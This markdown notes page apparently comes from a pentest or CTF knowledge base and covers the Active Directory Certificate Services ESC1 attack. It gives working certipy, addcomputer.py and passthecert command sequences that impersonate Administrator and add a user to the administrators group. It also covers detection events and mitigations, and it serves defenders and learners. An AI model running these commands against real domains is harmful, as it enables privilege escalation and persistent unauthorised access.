---
title: "AD CS: ESC1, when the requester chooses the subject"
tags: [windows, active-directory, adcs, esc1, certificates, passthecert]
---

# AD CS: ESC1, when the requester chooses the subject

**English** | [🇪🇸 Español](adcs-esc1.md)

## 1. When to look here

An Active Directory CA exists and a certificate template lets the requester supply the **subject/SAN**. If the template is also valid for authentication and a low-privileged account can enrol, that account can request a certificate in Administrator's name.

## 2. Conditions

ESC1 requires all of the following:

| Condition | Where to look |
|---|---|
| `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` (`0x1`) | template's `msPKI-Certificate-Name-Flag` |
| Client-authentication EKU | `pKIExtendedKeyUsage` with `1.3.6.1.5.5.7.3.2` (or Smart Card Logon / Any Purpose) |
| Enrolment for non-privileged accounts | enrolment ACE in the template descriptor |
| No manager approval | `msPKI-Enrollment-Flag` without `CT_FLAG_PEND_ALL_REQUESTS` (`0x2`) |
| No authorized signatures | `msPKI-RA-Signature` = 0 |

The CA must publish the template; a vulnerable template that is not published cannot be requested. On Authority, `Domain Computers` holds the right, so the attacker creates a computer account.

## 3. Attack

1. Enumerate with `certipy-ad find -vulnerable` or `Certify.exe find /vulnerable`.
2. Check the enrolment right: a user, a group or `Domain Computers`.
3. If a computer account is needed, check `MachineAccountQuota` and create one:

```bash
addcomputer.py 'domain.tld/user' -method LDAPS -computer-name '<MACHINE>' \
  -computer-pass '<PASS>' -dc-ip <DC_IP>
```

4. Request the certificate with Administrator's UPN:

```bash
certipy-ad req -u '<MACHINE>$@domain.tld' -p '<PASS>' \
  -ca <CA_NAME> -dc-ip <DC_IP> -template <TEMPLATE> \
  -upn administrator@domain.tld
```

The result is a `.pfx` with the private key. The certificate's identity comes from the SAN, not from the account that requested it.

## 4. PKINIT and Schannel

The usual path is PKINIT:

```bash
certipy-ad auth -pfx administrator.pfx -dc-ip <DC_IP>
```

If the DC has no KDC certificate, it returns `KDC_ERR_PADATA_TYPE_NOSUPP`. The certificate is still valid; use it over **Schannel/LDAPS** with PassTheCert:

```bash
certipy-ad cert -pfx administrator.pfx -nocert -out administrator.key
certipy-ad cert -pfx administrator.pfx -nokey -out administrator.crt
python3 passthecert.py -action ldap-shell -crt administrator.crt \
  -key administrator.key -domain domain.tld -dc-ip <DC_IP>
```

Inside the shell the account can be added to a privileged group:

```text
add_user_to_group <USER> administrators
```

The certificate survives a password change on the impersonated account, so it is **persistence** as well as escalation. Rotating the password does not revoke it: revoke the certificate on the CA.

## 5. Detection

- Templates with `ENROLLEE_SUPPLIES_SUBJECT` and an authentication EKU: periodic review with Certipy, Defender for Identity or ADCS exposure assessment.
- Certificate requests and issuance: Certificate Services events 4886 and 4887.
- Kerberos PKINIT authentications (4768/4769) from unusual accounts and hosts.
- Template and enrolment descriptor changes: 5136 on `Certificate Templates` objects.
- Computer account creation and a non-zero `MachineAccountQuota`.
- Additions to `Administrators` or `Domain Admins`: 4728/4732.
- Certificates issued for a UPN other than the requester's `sAMAccountName`; compare the SAN with the requesting account.

## 6. Mitigation

- Remove **Supply in the request** from the template (clear “Supply in the request” in `certtmpl.msc`).
- Require manager approval (`CT_FLAG_PEND_ALL_REQUESTS`) or authorized signatures (`msPKI-RA-Signature` > 0).
- Restrict enrolment to specific groups; remove `Domain Computers` when the template does not need it.
- Set `MachineAccountQuota` to 0 when unmanaged computers are not used.
- Review every published template, not only those a tool flags as vulnerable.
- Follow the strong certificate mapping guidance (KB5014754) and plan full enforcement; it reduces abuse of certificates without a SID, but it does not fix an ESC1 template.
- Separate the CA from enrolment servers and limit who can modify templates and permissions.

CWE-284 (improper access control), CWE-295 (improper certificate validation). MITRE T1649 (steal or forge authentication certificates), T1078.002 (domain accounts), T1552.001 (credentials in files).

References: SpecterOps “Certified Pre-Owned”, Microsoft [MS-CRTD] `msPKI-Certificate-Name-Flag`, KB5014754 and the Certipy/PassTheCert documentation.
